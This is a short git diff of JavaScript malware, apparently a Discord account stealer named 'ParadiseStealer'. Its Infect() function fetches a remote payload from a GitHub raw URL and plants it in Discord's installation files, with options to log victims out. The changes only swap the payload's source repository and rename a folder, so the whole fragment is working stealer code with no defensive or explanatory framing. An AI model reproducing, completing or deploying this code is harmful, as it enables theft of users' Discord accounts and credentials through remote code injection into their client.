@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/obf', (resp) => {
+    https.get('https://raw.githubusercontent.com/RustlerJS/rustlers/main/deneme3', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -62,7 +62,7 @@ function Infect() {
                 }
                 if ( config.logout != "false" ) {
 
-                    let folder = file.replace("index.js", "ParadiseStealerBTW")
+                    let folder = file.replace("index.js", "ParadiseStealer")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
